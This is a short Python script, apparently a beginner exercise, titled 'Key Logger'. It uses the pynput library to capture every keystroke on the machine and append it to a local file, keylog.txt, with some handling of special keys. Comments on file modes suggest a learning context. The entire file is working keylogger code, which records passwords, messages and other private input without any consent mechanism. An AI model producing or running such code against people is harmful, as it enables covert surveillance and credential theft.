# Key Logger
# File Handling
# Read(r), Write(w), Append(a)

# written_file = open("Keylog.txt",'a')
# written_file.write("\nIam the God")
# written_file.close()

# with Keyword - automatically closes the file that are memory allocated

from pynput.keyboard import Listener


def input_key_value(key):
    key_string = str(key)
    key_string = key_string.replace("'", "")

    if key_string == "Key.alt_l":
        key_string = ""
    if key_string == "Key.tab":
        key_string = ""
    if key_string == "Key.shift":
        key_string = ""
    if key_string == "Key.enter":
        key_string = "\n"
    if key_string == "Key.space":
        key_string = ' '
    if key_string == "Key.backspace":
        key_string = ""
        key_string = key_string[:-1]

    with open("keylog.txt", 'a') as write_file:
        write_file.write(key_string)


with Listener(on_press=input_key_value) as l:
    l.join()
